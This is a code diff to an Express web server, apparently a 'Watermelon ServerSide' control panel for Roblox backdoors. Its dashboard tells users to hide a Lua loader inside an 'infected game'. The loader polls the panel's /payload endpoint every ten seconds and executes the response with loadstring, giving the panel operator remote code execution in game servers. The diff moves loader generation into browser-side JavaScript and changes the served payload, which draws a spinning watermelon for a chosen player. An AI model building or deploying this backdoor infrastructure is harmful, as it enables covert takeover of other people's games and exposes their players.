@@ -3,9 +3,6 @@ const app = express();
 
 app.use(express.json());
 
-// Global variable to hold your targeted Roblox username
-let targetUsername = "YourRobloxUsername"; 
-
 // Complete Dashboard HTML/CSS/JS Interface
 app.get('/', (req, res) => {
     res.send(`
@@ -21,7 +18,7 @@ app.get('/', (req, res) => {
             /* Header & Spinning Watermelon */
             .header { display: flex; align-items: center; justify-content: space-between; border-bottom: 2px solid #24242b; padding-bottom: 15px; margin-bottom: 20px; }
             .logo-area { display: flex; align-items: center; gap: 15px; }
-            .watermelon-logo { font-size: 40px; display: inline-block; animation: spin 4s linear infinite; }
+            .watermelon-logo { font-size: 40px; display: inline-block; animation: spin 2s linear infinite; }
             @keyframes spin { 100% { transform: rotate(360deg); } }
             
             /* Tabs Configuration */
@@ -36,7 +33,7 @@ app.get('/', (req, res) => {
             input { background: #24242b; color: #fff; width: 70%; margin-right: 10px; }
             .action-btn { background: #4caf50; color: white; cursor: pointer; font-weight: bold; }
             .action-btn:hover { background: #45a049; }
-            pre { background: #0f0f12; padding: 15px; border-radius: 6px; color: #00ff00; overflow-x: auto; font-family: monospace; }
+            pre { background: #0f0f12; padding: 15px; border-radius: 6px; color: #00ff00; overflow-x: auto; font-family: monospace; user-select: all; }
         </style>
     </head>
     <body>
@@ -46,7 +43,7 @@ app.get('/', (req, res) => {
                     <span class="watermelon-logo">🍉</span>
                     <h2>Watermelon ServerSide Panel</h2>
                 </div>
-                <div>Status: <span style="color:#4caf50;">● Connected</span></div>
+                <div>Status: <span style="color:#4caf50;">● Online</span></div>
             </div>
 
             <!-- Navigation Tabs -->
@@ -59,18 +56,18 @@ app.get('/', (req, res) => {
             <!-- Dashboard Content -->
             <div id="dashboard" class="tab-content active">
                 <h3>Account Settings</h3>
-                <p>Set your real Roblox username here. When you join any infected game, the Watermelon SS will instantly load exclusively for you.</p>
+                <p>Change the username below to generate your unique server script.</p>
                 <div style="margin-top: 20px;">
-                    <input type="text" id="usernameInput" value="${targetUsername}" placeholder="Enter Roblox Username">
-                    <button class="action-btn" onclick="updateUsername()">Save Username</button>
+                    <input type="text" id="usernameInput" value="YourRobloxUsername" placeholder="Enter Roblox Username">
+                    <button class="action-btn" onclick="updateUsername()">Generate Script</button>
                 </div>
             </div>
 
             <!-- Scripts Content -->
             <div id="scripts" class="tab-content">
                 <h3>ServerSide Script Executor</h3>
-                <p>Copy this loader script and hide it inside a model or script in your infected game:</p>
-                <pre>-- Watermelon SS Infected Game Loader\nlocal url = "${req.protocol}://${req.get('host')}/payload"\nlocal http = game:GetService("HttpService")\n\nwhile true do\n    local success, response = pcall(function()\n        return http:GetAsync(url)\n    end)\n    if success and response then\n        local func, err = loadstring(response)\n        if func then pcall(func) end\n    end\n    task.wait(10)\nend</pre>
+                <p>Copy this custom script and hide it inside your infected game's scripts:</p>
+                <pre id="scriptBox">-- Click 'Generate Script' on the Dashboard first!</pre>
             </div>
 
             <!-- Games Content -->
@@ -93,12 +90,13 @@ app.get('/', (req, res) => {
 
             function updateUsername() {
                 const user = document.getElementById('usernameInput').value;
-                fetch('/update-user', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: user })
-                }).then(res => res.json())
-                  .then(data => alert('Target Username Updated to: ' + data.currentUsername));
+                const hostUrl = window.location.origin;
+                
+                const generatedLua = \`-- Watermelon SS Infected Game Loader\\nlocal url = "\${hostUrl}/payload?user=\${user}"\\nlocal http = game:GetService("HttpService")\\n\\nwhile true do\\n    local success, response = pcall(function()\\n        return http:GetAsync(url)\\n    end)\\n    if success and response then\\n        local func, err = loadstring(response)\\n        if func then pcall(func) end\\n    end\\n    task.wait(10)\\nend\`;
+                
+                document.getElementById('scriptBox').innerText = generatedLua;
+                switchTab('scripts');
+                alert('Script generated successfully for player: ' + user);
             }
         </script>
     </body>
@@ -106,22 +104,16 @@ app.get('/', (req, res) => {
     `);
 });
 
-// Endpoint to change your saved Roblox username
-app.post('/update-user', (req, res) => {
-    if (req.body.username) {
-        targetUsername = req.body.username;
-    }
-    res.json({ success: true, currentUsername: targetUsername });
-});
-
 // Endpoint that the infected game continuously pings for payloads
 app.get('/payload', (req, res) => {
-    // This Lua payload runs instantly inside the Roblox server when called
+    // Reads the username dynamically passed through the web query string
+    const targetUsername = req.query.user || "Player";
+
     const luaPayload = `
         local targetUser = "${targetUsername}"
         
-        game.Players.PlayerAdded:Connect(function(player)
-            if player.Name == targetUser then
+        local function applyWatermelon(player)
+            if player.Name == targetUser and not player:WaitForChild("PlayerGui"):FindFirstChild("WatermelonSS_Indicator") then
                 -- Build UI Layer
                 local sg = Instance.new("ScreenGui")
                 sg.Name = "WatermelonSS_Indicator"
@@ -131,7 +123,7 @@ app.get('/payload', (req, res) => {
                 -- Create Logo Icon
                 local label = Instance.new("TextLabel")
                 label.Size = UDim2.new(0, 80, 0, 80)
-                label.Position = UDim2.new(0, 20, 1, -100) -- Bottom Left Side
+                label.Position = UDim2.new(0, 40, 1, -120) -- Bottom Left Side
                 label.BackgroundTransparency = 1
                 label.Text = "🍉"
                 label.TextSize = 50
@@ -141,13 +133,21 @@ app.get('/payload', (req, res) => {
                 -- Smooth Continuous Spinning Loop
                 local rotation = 0
                 game:GetService("RunService").Heartbeat:Connect(function(dt)
-                    rotation = (rotation + (90 * dt)) % 360 -- Spins 90 degrees every second
+                    rotation = (rotation + (150 * dt)) % 360 -- Spinning watermelon effect
                     label.Rotation = rotation
                 end)
                 
-                print("Watermelon ServerSide successfully initialized for user: " .. targetUser)
+                print("Watermelon ServerSide loaded successfully for user: " .. targetUser)
             end
-        end)
+        end
+
+        -- Check players already in the server
+        for _, p in ipairs(game.Players:GetPlayers()) do
+            applyWatermelon(p)
+        end
+
+        -- Check players joining later
+        game.Players.PlayerAdded:Connect(applyWatermelon)
     `;
     res.set('Content-Type', 'text/plain');
     res.send(luaPayload);
